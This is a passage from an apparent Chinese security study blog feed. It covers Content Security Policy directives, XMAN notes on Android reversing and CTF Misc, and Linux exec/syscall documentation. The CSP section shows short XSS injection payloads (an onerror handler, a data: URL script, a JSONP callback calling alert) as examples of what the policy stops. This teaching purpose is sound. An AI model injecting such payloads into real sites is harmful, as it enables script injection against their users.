<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&gt; &#123;</div><div class="line">&gt;   &quot;csp-report&quot;: &#123;</div><div class="line">&gt;     &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,</div><div class="line">&gt;     &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,</div><div class="line">&gt;     &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,</div><div class="line">&gt;     &quot;violated-directive&quot;: &quot;script-src &apos;self&apos; https://apis.google.com&quot;,</div><div class="line">&gt;     &quot;original-policy&quot;: &quot;script-src &apos;self&apos; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;</div><div class="line">&gt;   &#125;</div><div class="line">&gt; &#125;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091304.png" alt="img"></p>
<h2 id="三、Content-Security-Policy-Report-Only"><a href="#三、Content-Security-Policy-Report-Only" class="headerlink" title="三、Content-Security-Policy-Report-Only"></a>三、Content-Security-Policy-Report-Only</h2><p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。</p>
<p>它必须与<code>report-uri</code>选项配合使用。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy-Report-Only: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<h2 id="四、选项值"><a href="#四、选项值" class="headerlink" title="四、选项值"></a>四、选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<blockquote>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
</ul>
</blockquote>
<p>多个值也可以并列，用空格分隔。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt; # 错误的写法</div><div class="line">&gt; script-src https://host1.com; script-src https://host2.com</div><div class="line">&gt;</div><div class="line">&gt; # 正确的写法</div><div class="line">&gt; script-src https://host1.com https://host2.com</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>如果不设置某个限制选项，就是默认允许任何值。</p>
<h2 id="五、script-src-的特殊值"><a href="#五、script-src-的特殊值" class="headerlink" title="五、script-src 的特殊值"></a>五、script-src 的特殊值</h2><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<blockquote>
<ul>
<li><strong>&#39;unsafe-inline&#39;</strong>：允许执行页面内嵌的<code>&amp;lt;script&gt;</code>标签和事件监听函数</li>
<li><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
<li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li>
<li><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
</ul>
</blockquote>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</div><div class="line">&gt;   // some code</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>注意，计算hash值的时候，\&lt;script>标签不算在内。</p>
<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
<h2 id="六、注意点"><a href="#六、注意点" class="headerlink" title="六、注意点"></a>六、注意点</h2><p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
<p>下面是两个恶意攻击的例子。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;img src=&quot;x&quot; onerror=&quot;evil()&quot;&gt;</div><div class="line">&gt; &lt;script src=&quot;data:text/javascript,evil()&quot;&gt;&lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>（3）必须特别注意 JSONP 的回调函数。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script</div><div class="line">&gt; src=&quot;/path/jsonp?callback=alert(document.domain)//&quot;&gt;</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
<h2 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h2><ul>
<li><a href="https://research.google.com/pubs/pub45542.html" target="_blank" rel="external">CSP Is Dead, Long Live CSP! </a>, by Lukas Weichselbaum</li>
<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/" target="_blank" rel="external">An Introduction to Content Security Policy</a>, by Mike West</li>
</ul>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> csp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN之旅——Android]]></title>
      <url>/2017/08/11/XMAN%E4%B9%8B%E6%97%85%E2%80%94%E2%80%94Android/</url>
      <content type="html"><![CDATA[<h3 id="1-赵帅讲android基础"><a href="#1-赵帅讲android基础" class="headerlink" title="1. 赵帅讲android基础"></a>1. 赵帅讲android基础</h3><h4 id="1-1-APK的文件结构"><a href="#1-1-APK的文件结构" class="headerlink" title="1.1 APK的文件结构"></a>1.1 APK的文件结构</h4><p><strong>重要的标签及属性</strong></p>
<ul>
<li>Minsdklevel</li>
<li>Targetsdklevel</li>
<li>android:enable</li>
<li>android:export</li>
<li>Android:process</li>
<li>Browerable</li>
</ul>
<p><strong>jar包和apk包</strong></p>
<h4 id="1-2-常见的基本类型"><a href="#1-2-常见的基本类型" class="headerlink" title="1.2 常见的基本类型"></a>1.2 常见的基本类型</h4><p>反编译采用的是dalvik字节码，反编译之后成为smali文件。</p>
<p>dalvik字节码有两种类型，原始类型和引用类型。对象和数组是引用类型，其它都是原始类型。</p>
<p>smali数据类型都是用一个字母表示，如果你熟悉Java的数据类型，你会发现表示smali数据类型的字母其实是Java基本数据类型首字母的大写，除boolean类型外，在smail中用大写的”Z”表示boolean类型。</p>
<table>
<thead>
<tr>
<th>标识</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>V</td>
<td>void，只能用于返回值类型</td>
</tr>
<tr>
<td>Z</td>
<td>boolean</td>
</tr>
<tr>
<td>B</td>
<td>byte</td>
</tr>
<tr>
<td>S</td>
<td>short</td>
</tr>
<tr>
<td>C</td>
<td>char</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
</tr>
<tr>
<td>J</td>
<td>long (64 bits)</td>
</tr>
<tr>
<td>F</td>
<td>float</td>
</tr>
<tr>
<td>D</td>
<td>double (64 bits)</td>
</tr>
<tr>
<td>L</td>
<td>对象类型</td>
</tr>
<tr>
<td>[</td>
<td>数据类型</td>
</tr>
</tbody>
</table>
<p>对象以Lpackage/name/ObjectName;的形式表示。前面的L表示这是一个对象类型，package/name/是该对象所在的包，ObjectName是对象的名字，“;”表示对象名称的结束。相当于java中的package.name.ObjectName。</p>
<p><strong>类的表示形式</strong></p>
<blockquote>
<p>Ljava/lang/String;相当于java.lang.String</p>
</blockquote>
<p><strong>数组的表示形式</strong></p>
<blockquote>
<p>[ 表示一个整型一维数组，相当于java中的int[]<br>对于多维数组，只要增加[就行了。[[I相当于int[][]，[[[I相当于int[][][]。注意每一维的最多255个。</p>
</blockquote>
<p><strong>对象数组的表示</strong></p>
<blockquote>
<p>[Ljava/lang/String;表示一个String对象数组。</p>
</blockquote>
<p><strong>方法表示形式</strong></p>
<p>方法通常必须详细的指定方法类型: 方法名，参数类型，返回类型，所有这些信息都是为虚拟机是能够找到正确的方法并执行。</p>
<blockquote>
<p>Lpackage/name/ObjectName;-&gt;MethodName(III)Z</p>
</blockquote>
<p>在上面的例子中，Lpackage/name/ObjectName;表示类，MethodName是方法名。III为参数（在此是3个整型参数），Z是返回类型（bool型）。方法的参数是一个接一个的，中间没有隔开。</p>
<blockquote>
<p>一个更复杂的例子：method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;</p>
</blockquote>
<p>在java中则为：String method(int, int[][], int, String, Object[])</p>
<h4 id="1-3-Dalvik-Code"><a href="#1-3-Dalvik-Code" class="headerlink" title="1.3 Dalvik Code"></a>1.3 Dalvik Code</h4><p>掌握以上的字段和方法的描述,只能说我们懂了如何描述一个字段和方法,而关于方法中具体的逻辑则需要了解Dalvik中的指令集.因为Dalvik是基于寄存器的架构的,因此指令集和JVM中的指令集区别较大,反而更类似x86的中的汇编指令.</p>
<p><a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html" target="_blank" rel="external">Davilk指令集大全</a></p>
<h4 id="1-3-ELF"><a href="#1-3-ELF" class="headerlink" title="1.3 ELF"></a>1.3 ELF</h4><p>可以链接第三方库，可以解决历史代码问题，可以进行逻辑保护，一般用so文件表示。</p>
<h4 id="1-4-常见组件"><a href="#1-4-常见组件" class="headerlink" title="1.4 常见组件"></a>1.4 常见组件</h4><p><strong><a href="http://www.cnblogs.com/shen-hua/p/5811195.html" target="_blank" rel="external">组件一：Intent</a></strong></p>
<ul>
<li>Action</li>
<li>Component</li>
<li>Category</li>
<li>data</li>
</ul>
<blockquote>
<p>Android中提供了Intent机制来协助应用间的交互与通讯，或者采用更准确的说法是，Intent不仅可用于应用程序之间，也可用于应用程序内部的activity, service和broadcast receiver之间的交互。Intent这个英语单词的本意是“目的、意向、意图”。</p>
<p>Intent是一种运行时绑定（runtime binding)机制，它能在程序运行的过程中连接两个不同的组件。通过Intent，你的程序可以向Android表达某种请求或者意愿，Android会根据意愿的内容选择适当的组件来响应。</p>
</blockquote>
<p><img src="/images/2017-08-11/Intent.png" alt="组件详情"></p>
<p><strong>组件二：Service</strong></p>
<ul>
<li>onStart</li>
<li>onStartCommand</li>
<li>Exported</li>
<li>Android:process</li>
</ul>
<p><strong>组件三：Activity</strong></p>
<p><strong>组件四：Webview</strong></p>
<ul>
<li>setSavePassword</li>
<li>setJavascriptEnabled</li>
<li>addJavascriptInterface</li>
<li>Loadurl</li>
</ul>
<p><strong>组件五：PendingIntent</strong></p>
<ul>
<li>Notification</li>
<li>getActivity</li>
<li>getService</li>
<li>getBroadcast</li>
</ul>
<h4 id="1-5-运行时的目录结构"><a href="#1-5-运行时的目录结构" class="headerlink" title="1.5 运行时的目录结构"></a>1.5 运行时的目录结构</h4><p>私有目录</p>
<ul>
<li>/data/data/packagename</li>
</ul>
<p>sdcard</p>
<h4 id="1-6-工具"><a href="#1-6-工具" class="headerlink" title="1.6 工具"></a>1.6 工具</h4><p><strong>反编译工具</strong></p>
<ul>
<li>Dex2jar</li>
<li>jd-gui    ——jar包反编译</li>
<li>jadx        ——Apk反编译</li>
<li>jeb        ——Apk解包、反汇编、反编译</li>
</ul>
<p><strong>其他工具</strong></p>
<ul>
<li>Burpsuite</li>
<li>Akana</li>
<li>Janus</li>
</ul>
<h4 id="1-7-ctf中常用的方法"><a href="#1-7-ctf中常用的方法" class="headerlink" title="1.7 ctf中常用的方法"></a>1.7 ctf中常用的方法</h4><p><strong>HOOK</strong></p>
<ul>
<li>代码分析</li>
<li>目标方法筛选</li>
<li>编写脚本</li>
<li>运行测试</li>
</ul>
<p><strong>重打包</strong></p>
<ul>
<li>解包  apktool d</li>
<li>修改</li>
<li>打包  apktool b</li>
<li>签名</li>
</ul>
<h4 id="1-8-工业界漏洞"><a href="#1-8-工业界漏洞" class="headerlink" title="1.8 工业界漏洞"></a>1.8 工业界漏洞</h4><p><strong>组件暴露相关信息</strong></p>
<ul>
<li>Enabled  =&gt; true</li>
<li>exported  =&gt; false   (有intent-filter，默认值就是true)   关键</li>
<li>Action =&gt; 系统Action 非系统Action</li>
<li>Permission                                            关键</li>
<li>ContentProvider</li>
</ul>
<p><strong>攻击窗口</strong></p>
<ul>
<li>动态注册</li>
<li>窗口期</li>
</ul>
<p><strong>组件劫持</strong></p>
<ul>
<li>Activity劫持</li>
<li>Receiver劫持</li>
<li>Service劫持</li>
<li>intent嗅探</li>
</ul>
<p><strong>Webview组件问题</strong></p>
<ul>
<li>远程代码执行</li>
</ul>
]]></content>
      
        <categories>
            
            <category> xman </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN之旅——Misc]]></title>
      <url>/2017/08/11/XMAN%E4%B9%8B%E6%97%85%E2%80%94%E2%80%94Misc/</url>
      <content type="html"><![CDATA[<h3 id="1-Misc概述"><a href="#1-Misc概述" class="headerlink" title="1. Misc概述"></a>1. Misc概述</h3><p>MISC，即Miscellaneous，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</p>
<p>MISC，中文即杂项，包括隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据等。</p>
<p>竞赛过程中解MISC时会涉及到各种脑洞，各种花式技巧，主要考察选手的快速理解、学习能力以及日常知识积累的广度、深度。</p>
<p>MISC这一块并不像PWN\REVERSE等需要深厚的理论基础，所以我们直接从经典题目开始入手。</p>
<h3 id="2-Misc题目类型"><a href="#2-Misc题目类型" class="headerlink" title="2. Misc题目类型"></a>2. Misc题目类型</h3><p>Misc大体上分为Encode编码转换、Steg隐写分析、Forensic数字取证以及其他类型</p>
<h3 id="3-编码转换"><a href="#3-编码转换" class="headerlink" title="3. 编码转换"></a>3. 编码转换</h3><p>由于编码很多种，可以在网上找各种站长工具对编码进行转换，而且效率很高！</p>
<p>常见的编码有：base64、base32、base16、ascii、unicode、url、摩斯编码、曼切斯特编码等</p>
<h3 id="4-取证和隐写分析"><a href="#4-取证和隐写分析" class="headerlink" title="4. 取证和隐写分析"></a>4. 取证和隐写分析</h3><h4 id="4-1-常见的工具"><a href="#4-1-常见的工具" class="headerlink" title="4.1 常见的工具"></a>4.1 常见的工具</h4><p>文本编辑工具：</p>
<ul>
<li>010Editor</li>
<li>UtralEdit</li>
<li>Winhex</li>
</ul>
<p>隐写工具：</p>
<ul>
<li>StegSolver</li>
<li>Stegdetect</li>
<li>wbSteg4</li>
<li>MP3Stego</li>
<li>outguess</li>
<li>stepic</li>
<li>steghide</li>
</ul>
<p>其他工具：</p>
<ul>
<li>7zcracker</li>
<li>archpr</li>
<li>tweakpng</li>
<li>audacity</li>
<li>binwalk</li>
<li>foremost</li>
<li>Ffmpeg</li>
<li>Alternatestreamview</li>
<li>Dsfok-tools</li>
<li>Snow</li>
</ul>
<h4 id="4-2-常见的隐写术"><a href="#4-2-常见的隐写术" class="headerlink" title="4.2 常见的隐写术"></a>4.2 常见的隐写术</h4><p>从最早的图种(copy /b test.jpg+test.torrent test.jpg),<br>CTF比赛中最开始的图片隐写(JPG，PNG，GIF)<br>Word，PDF等隐写<br>音频，视频中的隐写(波形，频谱…….)<br>Exe中的病毒行为分析<br>Pcap流量包<br>磁盘文件(IMG,VMDK)<br>交换数据流(NTFS数据流)<br>HTML文件</p>
<h3 id="5-自己的思考"><a href="#5-自己的思考" class="headerlink" title="5. 自己的思考"></a>5. 自己的思考</h3><p>想要深入学习Misc，首先需要熟练掌握一些文件格式，并能够根据相应的格式合理运用工具，如此才能掌握Misc！</p>
]]></content>
      
        <categories>
            
            <category> xman </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[SROP攻击]]></title>
      <url>/2017/08/07/SROP%E6%94%BB%E5%87%BB/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下system()/execve()/execl()函数使用详解]]></title>
      <url>/2017/08/07/linux%E4%B8%8Bsystem-execve-execl-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
      <content type="html"><![CDATA[<p>本节详细可参考<br><a href="http://www.cnblogs.com/akira90/archive/2012/12/05/2802809.html" target="_blank" rel="external">http://www.cnblogs.com/akira90/archive/2012/12/05/2802809.html</a></p>
<h3 id="1-execve函数"><a href="#1-execve函数" class="headerlink" title="1. execve函数"></a>1. execve函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"> 相关函数： fork，execl，execle，execlp，execv，execvp</div><div class="line"></div><div class="line"> 表头文件： #include unistd.h</div><div class="line"></div><div class="line"> 定义函数： int execve(const char * filename,char * const argv[ ],char * const envp[ ]);</div><div class="line"></div><div class="line"> 函数说明： execve()用来执行参数filename字符串所代表的文件路径，第二个参数系利用数组指针来传递给执行文件，最后一个参数则为传递给执行文件的新环境变量数组。</div><div class="line"></div><div class="line"> 返回值：   如果执行成功则函数不会返回，执行失败则直接返回-1，失败原因存于errno 中。</div><div class="line"></div><div class="line"> 错误代码:</div><div class="line"></div><div class="line"> EACCES</div><div class="line"></div><div class="line">1. 欲执行的文件不具有用户可执行的权限。</div><div class="line">2. 欲执行的文件所属的文件系统是以noexec 方式挂上。</div><div class="line">3. 欲执行的文件或script翻译器非一般文件。</div><div class="line"></div><div class="line"> EPERM</div><div class="line"></div><div class="line">1.进程处于被追踪模式，执行者并不具有root权限，欲执行的文件具有SUID 或SGID 位。</div><div class="line"></div><div class="line">2.欲执行的文件所属的文件系统是以nosuid方式挂上，欲执行的文件具有SUID 或SGID 位元，但执行者并不具有root权限。</div><div class="line"></div><div class="line">E2BIG 参数数组过大</div><div class="line"></div><div class="line"> ENOEXEC 无法判断欲执行文件的执行文件格式，有可能是格式错误或无法在此平台执行。</div><div class="line"></div><div class="line"> EFAULT 参数filename所指的字符串地址超出可存取空间范围。</div><div class="line"></div><div class="line"> ENAMETOOLONG 参数filename所指的字符串太长。</div><div class="line"></div><div class="line"> ENOENT 参数filename字符串所指定的文件不存在。</div><div class="line"></div><div class="line"> ENOMEM 核心内存不足</div><div class="line"></div><div class="line"> ENOTDIR 参数filename字符串所包含的目录路径并非有效目录</div><div class="line"></div><div class="line"> EACCES 参数filename字符串所包含的目录路径无法存取，权限不足</div><div class="line"></div><div class="line"> ELOOP 过多的符号连接</div><div class="line"></div><div class="line"> ETXTBUSY 欲执行的文件已被其他进程打开而且正把数据写入该文件中</div><div class="line"></div><div class="line"> EIO I/O 存取错误</div><div class="line"></div><div class="line"> ENFILE 已达到系统所允许的打开文件总数。</div><div class="line"></div><div class="line"> EMFILE 已达到系统所允许单一进程所能打开的文件总数。</div><div class="line"></div><div class="line"> EINVAL 欲执行文件的ELF执行格式不只一个PT_INTERP节区</div><div class="line"></div><div class="line"> EISDIR ELF翻译器为一目录</div><div class="line"></div><div class="line"> ELIBBAD ELF翻译器有问题。</div></pre></td></tr></table></figure>
<h3 id="2-system-函数"><a href="#2-system-函数" class="headerlink" title="2. system()函数"></a>2. system()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">相关函数： fork，execve，waitpid，popen</div><div class="line"></div><div class="line">表头文件： #include stdlib.h</div><div class="line"></div><div class="line">定义函数： int system(const char * string);</div><div class="line"></div><div class="line">函数说明： system()会调用fork()产生子进程，由子进程来调用/bin/sh  c string来执行参数string字符串所代表的命令，此命&gt;令执行完后随即返回原调用的进程。在调用system()期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。</div><div class="line"></div><div class="line">返回值：</div><div class="line"></div><div class="line">    =-1:出现错误</div><div class="line">    =0:调用成功但是没有出现子进程</div><div class="line">    &gt;0:成功退出的子进程的id</div><div class="line"></div><div class="line">如果system()在调用/bin/sh时失败则返回127，其他失败原因返回-1。若参数string为空指针(NULL)，则返回非零值&gt;。 如果system()调用成功则最后会返回执行shell命令后的返回值，但是此返回值也有可能为 system()调用/bin/sh失败所返回的127，因此最好能再检查errno 来确认执行成功。</div><div class="line"></div><div class="line">附加说明： 在编写具有SUID/SGID权限的程序时请勿使用system()，system()会继承环境变量，通过环境变量可能会造成系统安全的问题。</div></pre></td></tr></table></figure>
<h3 id="3-execl-函数"><a href="#3-execl-函数" class="headerlink" title="3. execl()函数"></a>3. execl()函数</h3><p>int execl(const char * filename,char * const argv[ ],char * const envp[ ]);</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[int 80h系统调用方法]]></title>
      <url>/2017/08/07/int-80h%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-int-0x80简介"><a href="#1-int-0x80简介" class="headerlink" title="1. int 0x80简介"></a>1. int 0x80简介</h3><p>先看看下面通过系统调用实现的hello world代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">.section .data</div><div class="line">msg:</div><div class="line">        .ascii &quot;Hello world!\n&quot;</div><div class="line"></div><div class="line">.section .text</div><div class="line"></div><div class="line">.globl _start</div><div class="line"></div><div class="line">_start:</div><div class="line">        movl $4, %eax</div><div class="line">        movl $1, %ebx</div><div class="line">        movl $msg, %ecx</div><div class="line">        movl $13, %edx</div><div class="line">        int $0x80</div><div class="line">        movl $1, %eax</div><div class="line">        movl $0, %ebx</div><div class="line">        int $0x80</div></pre></td></tr></table></figure></p>
<p>系统调用是通过int 0x80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数，从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int $0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int $0x80之前eax为1表示调用exit，ebx为0表示返回0。</p>
<h3 id="2-系统调用功能号"><a href="#2-系统调用功能号" class="headerlink" title="2. 系统调用功能号"></a>2. 系统调用功能号</h3><p>这部分可以参考<a href="http://www.linfo.org/system_call_number.html" target="_blank" rel="external">System Call Number Definition</a><br>以及<a href="http://asm.sourceforge.net/syscall.html#2" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html#2</a></p>
<p>其实调用功能号放在了/usr/include/asm/unistd.h之中，打开文件发现：</p>
<blockquote>
<p>cat /usr/include/asm/unistd.h | less</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit                 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork                 2</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read                 3</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write                4</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open                 5</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close                6</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid              7</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat                8</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link                 9</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink              10</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve              11</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir               12</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time                13</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod               14</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod               15</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown              16</span></div></pre></td></tr></table></figure>
<p>总共有383条，就不细细讲述了</p>
<h3 id="3-系统调用及参数传递过程"><a href="#3-系统调用及参数传递过程" class="headerlink" title="3. 系统调用及参数传递过程"></a>3. 系统调用及参数传递过程</h3><p>这部分具体可以参考：<br><a href="http://blog.chinaunix.net/uid-10386087-id-2958669.html" target="_blank" rel="external">系统调用及参数传递过程</a><br><a href="http://blog.chinaunix.net/uid-10386087-id-2958670.html" target="_blank" rel="external">深入理解Linux的系统调用</a></p>
